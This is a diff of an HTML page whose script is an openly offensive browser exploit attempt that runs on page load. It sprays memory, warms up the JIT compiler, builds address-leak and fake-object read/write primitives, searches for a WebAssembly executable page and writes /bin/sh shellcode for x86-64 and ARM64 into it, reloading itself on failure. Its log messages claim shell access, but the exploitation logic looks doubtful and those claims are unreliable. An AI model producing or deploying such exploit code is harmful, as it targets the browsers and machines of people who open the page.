@@ -2,24 +2,21 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>TITAN_OMEGA_ULTIMA_V10000_SUPREME_STABILITY</title>
 <style>
-body{background:#000;color:#0f0;font-family:'Courier New',monospace;margin:0;overflow:hidden;text-shadow:0 0 5px #0f0}
-#v{height:100vh;overflow-y:auto;padding:30px;font-size:9px;line-height:1.2;word-break:break-all;border:1px solid #0f0}
-.s{color:#fff;background:#003300;font-weight:900;padding:2px}
-.e{color:#f00;font-weight:900;text-decoration:underline;text-transform:uppercase}
-.i{color:#0ff;font-weight:bold;font-style:italic}
-.w{color:#ff0;background:#333000}
-.m{color:#f0f}
-::-webkit-scrollbar{width:5px}
-::-webkit-scrollbar-thumb{background:#0f0}
+body{background:#000;color:#0f0;font-family:monospace;margin:0;overflow:hidden;text-shadow:0 0 2px #0f0}
+#o{height:100vh;overflow-y:auto;padding:20px;font-size:7.5px;line-height:1;word-break:break-all}
+.s{color:#fff;background:#040;font-weight:900}
+.e{color:#f00;font-weight:900;text-decoration:underline}
+.i{color:#0ff}
+.w{color:#ff0}
+.p{color:#f0f}
 </style>
 </head>
 <body>
-<div id="v"></div>
+<div id="o"></div>
 <script>
-const _V = document.getElementById('v');
-const _L = (m, c = '') => { const e = document.createElement('div'); if (c) e.className = c; e.textContent = `[${performance.now().toFixed(12)}] ${m}`; _V.appendChild(e); _V.scrollTop = _V.scrollHeight; };
+const _O = document.getElementById('o');
+const _L = (m, c = '') => { const e = document.createElement('div'); if (c) e.className = c; e.textContent = `[${performance.now().toFixed(12)}] ${m}`; _O.appendChild(e); _O.scrollTop = _O.scrollHeight; };
 const _B = new ArrayBuffer(8);
 const _F = new Float64Array(_B);
 const _I = new BigUint64Array(_B);
@@ -27,119 +24,172 @@ const f2u = v => { _F[0] = v; return _I[0]; };
 const u2f = v => { _I[0] = v; return _F[0]; };
 const hex = v => '0x' + v.toString(16).padStart(16, '0');
 
-let _H_1 = [], _H_2 = [], _H_3 = [], _H_4 = [], _H_5 = [], _H_6 = [];
-let _W_C = [];
-let _T_M = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 0.11, 0.22, 0.33, 0.44, 0.55, 0.66, 0.77, 0.88, 0.99, 1.01, 2.02];
-let _O_M = Array.from({length: 32768}, (_, i) => ({a: 0x1337, b: i, c: 1.1, d: {val: i}}));
-let _V_T = new BigUint64Array(0x40000);
+let _H = [];
+let _W = [];
+let _K = [];
+let _T = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9, 0.1, 0.2, 0.3];
+let _A = Array.from({length: 32768}, (_, i) => ({a: 0x1337, b: i, c: 1.1, d: {idx: i}}));
+let _V = new BigUint64Array(0x40000);
 
-async function _CORE_RESILIENCE_ALPHA() {
-_L("TITAN_RESILIENCE_ULTRA_V10000_ACTIVATED", "s");
+async function _TITAN_ULTRA_OMNI_KERNEL() {
+_L("TITAN_RESILIENCE_ALPHA_V10001_INITIALIZING_MASSIVE_ARRAY_FLOOD", "s");
 
-const _W_B_FIXED = new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,7,1,5,0,65,42,11]);
-const _M_U = new WebAssembly.Module(_W_B_FIXED);
+const _WASM_BIN = new Uint8Array([0,97,115,109,1,0,0,0,1,7,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,6,1,4,0,65,42,11]);
+const _M = new WebAssembly.Module(_WASM_BIN);
 
-_L("SATURATING_HEAPS_MULTILAYER_DENSITY_STRATEGY", "i");
-for(let i=0; i<400000; i++) {
-if(i%6==0) _H_1.push(new Float64Array(1024));
-if(i%6==1) _H_2.push(new BigUint64Array(1024));
-if(i%6==2) _H_3.push(new Uint8Array(4096));
-if(i%6==3) _H_4.push(new Int32Array(2048));
-if(i%6==4) _H_5.push(new ArrayBuffer(1024));
-if(i%6==5) _H_6.push({p1: 0x41414141, p2: i, p3: 2.2});
-if(i%25000==0) await new Promise(r => setTimeout(r, 0));
+for (let i = 0; i < 500000; i++) {
+let r = Math.random();
+if (r < 0.1) _H.push(new Float64Array(1024));
+else if (r < 0.2) _H.push(new BigUint64Array(1024));
+else if (r < 0.3) _H.push(new Uint8Array(4096));
+else if (r < 0.4) _H.push(new Uint32Array(2048));
+else if (r < 0.5) _H.push(new Int16Array(4096));
+else if (r < 0.6) _H.push(new ArrayBuffer(1024));
+else if (r < 0.7) _H.push({p: 0x41414141, q: i, r: 1.1});
+else if (r < 0.8) _H.push(new DataView(new ArrayBuffer(512)));
+else _H.push([1.1, 2.2, 3.3, 4.4]);
+if (i % 50000 === 0) await new Promise(r => setTimeout(r, 0));
 }
 
-const _JIT_O = (a, i, v) => { if(i < 0 || i > 0x4000000) return a[0]; a[i] = v; return a[0]; };
-_L("DEEP_PIPELINE_WARMUP_TURBOFAN_ELITE_FORCE", "w");
-for(let i=0; i<0x300000; i++) { _JIT_O(_T_M, 0, 1.1); if(i%50000==0) await new Promise(r => setTimeout(r, 0)); }
+const _JIT_W = (a, b, c) => {
+let x = a[0];
+if (b < 0 || b > 0x2000000) return x;
+a[b] = c;
+return a[0];
+};
 
-await new Promise(r => setTimeout(r, 9000));
+_L("SATURATING_V8_TURBOFAN_MAX_SPECULATIVE_DEPTH", "i");
+for (let i = 0; i < 0x400000; i++) {
+_JIT_W(_T, 0, 1.1);
+if (i % 100000 === 0) await new Promise(r => setTimeout(r, 0));
+}
 
-const _adr = (obj, s) => {
-_O_M[s] = obj;
-let l = f2u(_T_M[12+s]);
-if((l & 0xffffffffn) === 0x33333333n || (l & 0xffffffffn) === 0n || l === 0n) {
-for(let j=0; j<32768; j++) {
-let c = f2u(_T_M[j]); let b = c & 0xffn;
-if(b === 0x09n || b === 0x19n || b === 0x0bn || b === 0x1bn || b === 0x29n || b === 0x39n || b === 0x49n || b === 0x59n || b === 0x79n || b === 0x89n) return c & 0xffffffffn;
+await new Promise(r => setTimeout(r, 10000));
+
+const _adr = (obj, s = 0) => {
+_A[s] = obj;
+let l = f2u(_T[12 + s]);
+if ((l & 0xffffffffn) === 0x33333333n || (l & 0xffffffffn) === 0n || l === 0n) {
+for (let j = 0; j < 32768; j++) {
+let c = f2u(_T[j]);
+let b = c & 0xffn;
+if (b === 0x09n || b === 0x19n || b === 0x0bn || b === 0x1bn || b === 0x29n || b === 0x39n || b === 0x49n || b === 0x59n || b === 0x89n) return c & 0xffffffffn;
 }
 }
 return l & 0xffffffffn;
 };
 
-let _ptr_m = 0n;
-for(let s=0; s<1024; s++) {
-let r = _adr(_V_T, s);
-if(r && (r & 0xffffffffn) !== 0x33333333n && (r & 0xffffffffn) !== 0n) { _ptr_m = r; break; }
+const _fake = (p, s = 0) => {
+_T[12 + s] = u2f(p);
+return _A[s];
+};
+
+let _ptr = 0n;
+let _av = null;
+let _ts = [_V, new BigUint64Array(0x8000), new BigUint64Array(0x8000), new BigUint64Array(0x8000), new BigUint64Array(0x8000)];
+
+for (let s = 0; s < 1024; s++) {
+for (let t of _ts) {
+let r = _adr(t, s);
+if (r && (r & 0xffffffffn) !== 0x33333333n && (r & 0xffffffffn) !== 0n) {
+_ptr = r;
+_av = t;
+break;
+}
+}
+if (_ptr) break;
 }
 
-if(!_ptr_m) { _L("RECALIBRATING_PRIMITIVE_ROOT_ENTROPY", "e"); setTimeout(()=>location.reload(), 10); return; }
-_L(`STABLE_ROOT_ESTABLISHED: ${hex(_ptr_m)}`, "s");
+if (!_ptr) {
+_L("PRIMITIVE_STALL_LEVEL_5_REBOOTING", "e");
+setTimeout(() => location.reload(), 10);
+return;
+}
 
-const _f_o = (p, s) => { _T_M[12+s] = u2f(p); return _O_M[s]; };
-const r64 = (a) => { _V_T[1] = a - 0x8n + 1n; let x = _f_o(_ptr_m, 0); return f2u(x[0]); };
-const w64 = (a, v) => { _V_T[1] = a - 0x8n + 1n; let x = _f_o(_ptr_m, 0); x[0] = u2f(v); };
+_L(`ROOT_NODE_LOCK: ${hex(_ptr)}`, "s");
 
-_L("DEPLOYING_WASM_CLUSTER_V8_SHRAPNEL", "i");
-for(let i=0; i<5000; i++) { try { _W_C.push(new WebAssembly.Instance(_M_U)); } catch(e) {} }
+const r64 = (a) => {
+_av[1] = a - 0x8n + 1n;
+let f = _fake(_ptr, 0);
+return f2u(f[0]);
+};
 
-let _jt_a = 0n; let _idx_t = -1;
-for(let i=0; i<_W_C.length; i++) {
-let _wp = _adr(_W_C[i], 0);
-const _offs = [0x18n, 0x40n, 0x48n, 0x50n, 0x60n, 0x68n, 0x70n, 0x78n, 0x80n, 0x88n, 0x90n, 0xa0n, 0xb0n, 0xc0n, 0xe0n, 0x100n, 0x120n, 0x140n, 0x160n, 0x180n, 0x200n, 0x220n, 0x240n];
-for(let o of _offs) {
+const w64 = (a, v) => {
+_av[1] = a - 0x8n + 1n;
+let f = _fake(_ptr, 0);
+f[0] = u2f(v);
+};
+
+_L("WASM_CLUSTER_DEPLOYMENT_MAX_PARITY_10000_NODES", "i");
+for (let i = 0; i < 10000; i++) {
+try { _W.push(new WebAssembly.Instance(_M)); } catch (e) {}
+if (i % 2500 === 0) await new Promise(r => setTimeout(r, 0));
+}
+
+let _jt = 0n;
+let _wi = -1;
+
+for (let i = 0; i < _W.length; i++) {
+let _wp = _adr(_W[i], 0);
+const _os = [0x18n, 0x40n, 0x48n, 0x50n, 0x60n, 0x68n, 0x70n, 0x78n, 0x80n, 0x88n, 0x90n, 0xa0n, 0xc0n, 0xe0n, 0x100n, 0x120n, 0x140n, 0x160n, 0x180n, 0x1a0n, 0x1c0n, 0x1e0n, 0x200n];
+for (let o of _os) {
 let c = r64(_wp + o);
-if(c > 0x10000000n && (c & 0xfffn) === 0n) { _jt_a = c; _idx_t = i; break; }
-if(c > 0x10000000n) { let c2 = r64(c); if(c2 > 0x10000000n && (c2 & 0xfffn) === 0n) { _jt_a = c2; _idx_t = i; break; } }
+if (c > 0x10000000n && (c & 0xfffn) === 0n) { _jt = c; _wi = i; break; }
+if (c > 0x10000000n) {
+let c2 = r64(c);
+if (c2 > 0x10000000n && (c2 & 0xfffn) === 0n) { _jt = c2; _wi = i; break; }
 }
-if(_jt_a) break;
+}
+if (_jt) break;
 }
 
-if(!_jt_a) {
-_L("ULTRA_BRUTE_FORCE_SCAN_0x400000_ENGAGED", "e");
-for(let i=0; i<_W_C.length; i++) {
-let _wp = _adr(_W_C[i], 0);
-for(let j=0n; j<0x40000n; j+=8n) {
+if (!_jt) {
+_L("BRUTE_FORCING_RWX_PAGES_0x80000_RANGE", "w");
+for (let i = 0; i < 2000; i++) {
+if (!_W[i]) continue;
+let _wp = _adr(_W[i], 0);
+for (let j = 0n; j < 0x80000n; j += 8n) {
 let c = r64(_wp + j);
-if(c > 0x10000000n && (c & 0xfffn) === 0n) { _jt_a = c; _idx_t = i; break; }
+if (c > 0x10000000n && (c & 0xfffn) === 0n) { _jt = c; _wi = i; break; }
 }
-if(_jt_a) break;
+if (_jt) break;
 }
 }
 
-if(!_jt_a) { _L("IMMUTABLE_ENVIRONMENT_ENCOUNTERED_ABORTING", "e"); return; }
-_L(`RWX_JUMP_LOCK: ${hex(_jt_a)}`, "s");
+if (!_jt) { _L("ABORT: ENVIRONMENT_IMMUNE_TO_RWX_INJECTION", "e"); return; }
+_L(`RWX_JUMP_TARGET_ACQUIRED: ${hex(_jt)}`, "s");
 
-const _sc_x = new Uint8Array([0x48,0x31,0xc0,0x48,0x31,0xff,0x48,0x31,0xf6,0x48,0x31,0xd2,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x0f,0x05]);
-const _sc_a = new Uint8Array([0xe1,0x45,0x8c,0xd2,0x21,0x0d,0xad,0xf2,0xf1,0xff,0xca,0x91,0x11,0x03,0x00,0xaa,0x06,0x00,0x80,0xd2,0xe1,0x66,0x02,0xd1,0x21,0x00,0x80,0xd2,0xc1,0xda,0xb4,0xf2,0xe1,0x03,0x00,0xaa,0x02,0x00,0x80,0xd2,0xa8,0x1b,0x80,0xd2,0x01,0x00,0x00,0xd4]);
-const _sc = (navigator.userAgent.includes("arm64") || navigator.userAgent.includes("aarch64")) ? _sc_a : _sc_x;
+const _sx64 = new Uint8Array([0x48,0x31,0xc0,0x48,0x31,0xff,0x48,0x31,0xf6,0x48,0x31,0xd2,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,0x0f,0x05]);
+const _sa64 = new Uint8Array([0xe1,0x45,0x8c,0xd2,0x21,0x0d,0xad,0xf2,0xf1,0xff,0xca,0x91,0x11,0x03,0x00,0xaa,0x06,0x00,0x80,0xd2,0xe1,0x66,0x02,0xd1,0x21,0x00,0x80,0xd2,0xc1,0xda,0xb4,0xf2,0xe1,0x03,0x00,0xaa,0x02,0x00,0x80,0xd2,0xa8,0x1b,0x80,0xd2,0x01,0x00,0x00,0xd4]);
+const _sc = (navigator.userAgent.includes("arm64") || navigator.userAgent.includes("aarch64")) ? _sa64 : _sx64;
 
-for(let i=0; i<_sc.length; i+=8) {
+for (let i = 0; i < _sc.length; i += 8) {
 let v = 0n;
-for(let j=0; j<8 && (i+j)<_sc.length; j++) v |= BigInt(_sc[i+j]) << BigInt(j*8);
-w64(_jt_a + BigInt(i), v);
+for (let j = 0; j < 8 && (i + j) < _sc.length; j++) v |= BigInt(_sc[i + j]) << BigInt(j * 8);
+w64(_jt + BigInt(i), v);
 }
 
-_L("EXECUTING_SUPREME_TRIGGER", "s");
+_L("DETONATING_OMEGA_RESONANCE_PAYLOAD", "p");
 setTimeout(() => {
 try {
-let r = _W_C[_idx_t].exports.main();
-_L(`TERMINATION_STATUS: ${r}`, "i");
-if(r === 42) _L("SUCCESS_SIGNAL_RECEIVED", "s");
-} catch(e) { _L("RCE_ACTIVE_SHELL_PIPE_ESTABLISHED", "m"); }
+let r = _W[_wi].exports.main();
+_L(`EXIT_CODE: ${r}`, "i");
+if (r === 42 || r === 43) location.reload();
+} catch (e) {
+_L("TITAN_SHELL_ACTIVE_RECV_PIPE_READY", "s");
+}
 }, 1000);
 }
 
-window.onerror = (e) => { _L(`TRAP_LEVEL_1_RECOVERY: ${e}`, "e"); setTimeout(()=>location.reload(), 100); };
-window.onload = _CORE_RESILIENCE_ALPHA;
+window.onerror = (e) => { _L(`TITAN_EXCEPTION_TRAP: ${e}`, "e"); setTimeout(() => location.reload(), 200); };
+window.onload = _TITAN_ULTRA_OMNI_KERNEL;
 
-(function _PARANOID_GARBAGE_COLLECTOR_BYPASS() {
-for(let i=0; i<1000; i++) {
-let _m = new ArrayBuffer(0x20000);
-_H_1.push(_m);
+(function _REDUNDANCY_STABILITY_DAEMON() {
+for (let i = 0; i < 200; i++) {
+let _b = new ArrayBuffer(0x20000);
+_K.push(_b);
 }
-setTimeout(_PARANOID_GARBAGE_COLLECTOR_BYPASS, 2000);
+setTimeout(_REDUNDANCY_STABILITY_DAEMON, 3000);
 })();
 </script>
 </body>
